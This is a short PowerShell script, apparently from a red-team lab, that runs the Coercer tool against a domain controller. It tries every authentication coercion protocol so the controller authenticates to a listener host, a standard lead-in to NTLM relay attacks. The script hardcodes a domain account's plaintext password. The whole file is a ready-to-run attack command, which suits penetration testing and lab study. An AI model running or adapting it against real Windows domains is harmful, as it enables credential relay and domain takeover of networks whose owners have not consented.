# Run ALL coercion protocols from ws01 -> dc01 with plain UNC (listener .60)
$ErrorActionPreference = "Continue"
$env:PYTHONIOENCODING = "utf-8"
$env:PYTHONUTF8 = "1"
& "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce `
  -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 `
  -t 192.168.77.10 -l 192.168.77.60 --smb-port 445 `
  --auth-type smb --always-continue 2>&1 | Select-Object -Last 60
Write-Output "coerce_rc=$LASTEXITCODE"
Write-Output "=== ALL_COERCE_DONE ==="
